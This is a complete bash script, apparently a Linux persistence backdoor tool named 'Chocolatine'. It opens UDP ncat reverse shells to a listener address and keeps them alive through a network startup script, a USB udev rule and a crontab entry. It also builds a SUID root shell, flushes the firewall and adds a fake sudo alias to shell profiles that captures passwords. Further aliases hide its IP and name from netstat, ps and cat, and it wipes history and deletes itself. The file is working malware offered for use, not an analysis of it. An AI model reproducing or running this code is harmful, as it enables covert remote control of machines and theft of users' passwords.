#!/bin/bash
# _________ .__                        .__          __  .__
# \_   ___ \|  |__   ____   ____  ____ |  | _____ _/  |_|__| ____   ____
# /    \  \/|  |  \ /  _ \_/ ___\/  _ \|  | \__  \\   __\  |/    \_/ __ \
# \     \___|   Y  (  <_> )  \__(  <_> )  |__/ __ \|  | |  |   |  \  ___/
#  \______  /___|  /\____/ \___  >____/|____(____  /__| |__|___|  /\___  >
#         \/     \/            \/                \/             \/     \/
# v0.2 BETA                                         Last update 06/12/2017

LHOST="192.168.1.22"
LPORT="4242"
LMTHD="--udp"
TMPDIR="/var/lock"
TMPDIR2="/var/tmp"
TMPNAME=".systemd-private-0cc88885f64973be4892550e04bb7adc-colord.service-Y11cOF"
TMPNAME2=".systemd-private-8cfee1de0cea4c34b1b5399f401acc1f-systemd-timesyncd.service-IgCBE0"

# Module      : Ncat dependency
# Description : install ncat if not available on the machine
if ! [ -x "$(command -v ncat)" ]; then
  wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat -O $TMPDIR2/ncat 2> /dev/null
  chmod +x $TMPDIR2/ncat
  export PATH=/var/tmp:$PATH
fi


# Module      : Core Engine
# Description : Clean iptables, create a SUID binary, reverse shell root at startup inside /etc/network/if-up.d/upstart
cat << EOF > $TMPDIR2/chocolatine
#!/bin/bash

# clear iptables
iptables -F 2>/dev/null
iptables -X 2>/dev/null

# suid binary
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/croissant.c
gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
rm $TMPDIR2/croissant.c
chown root:root $TMPDIR2/croissant
chmod 4777 $TMPDIR2/croissant

# startup backdoor
RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart

# driver backdoor
echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null

rm $TMPDIR2/chocolatine
EOF
chmod +x $TMPDIR2/chocolatine
if [ `whoami` == 'root' ]
  then
    $TMPDIR2/chocolatine
fi


# Module      : Sudo Pot
# Description : Install sudo backdoor via alias
cat << EOF > /tmp/$TMPNAME2
alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \$locale  = "en" ]; then echo -n "[sudo] password for \$USER: ";fi;if [ \$locale  = "fr" ]; then echo -n "[sudo] Mot de passe de \$USER: ";fi;read -s pwd;echo; unalias sudo; echo "\$pwd" | /usr/bin/sudo -S $TMPDIR2/chocolatine 2> /dev/null && /usr/bin/sudo -S '
EOF
if [ -f ~/.bashrc ]; then
    cat /tmp/$TMPNAME2 >> ~/.bashrc
fi
if [ -f ~/.zshrc ]; then
    cat /tmp/$TMPNAME2 >> ~/.zshrc
fi
rm /tmp/$TMPNAME2


# Module      : Alias backdoor
# Description : Filter our IP and chocolatine keyword from output
cat << EOF > /tmp/$TMPNAME2
alias netstat='netstat -laputen| grep -v $LHOST| grep -v "chocolatine ;#"'
alias ps='ps -aux -laputen| grep -v $LHOST| grep -v "chocolatine ;#"'
alias top='ps -aux -laputen| grep  --line-buffered -v $LHOST| grep  --line-buffered -v "chocolatine ;#"'
alias cat='cat \$1| grep -v $LHOST| grep -v "chocolatine ;#"'
alias more='more \$1| grep -v $LHOST| grep -v "chocolatine ;#"'
alias tail='tail \$1| grep -v $LHOST| grep -v "chocolatine ;#"'
EOF


# Module      : Startup persistence user
# Description : Reverse shell hidden in a crontab every 10 minutes
SHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
echo $SHELL > $TMPDIR2/$TMPNAME
chmod +x $TMPDIR2/$TMPNAME
(crontab -l ; echo "*/10 * * * * $TMPDIR2/$TMPNAME")|crontab 2> /dev/null


# Module      : Basic reverse shell
# Description : ncat reverse shell udp : ncat --udp -lvp 4242
ncat $LMTHD $LHOST $LPORT -e "/bin/bash -c id;/bin/bash" 2>/dev/null &


# Module      : Clean history
# Description : Delete last line history
history -d $(history | tail -2 | awk '{print $1}') 2> /dev/null


# Module      : Auto remove
# Description : Selfdestructing file
rm $0 2> /dev/null


# Module      : Stealth cat
# Description : Hide the payload with ANSI chars
#[2J[2J[2J[2H[2A# Do not remove. Generated from /etc/issue.conf by configure.
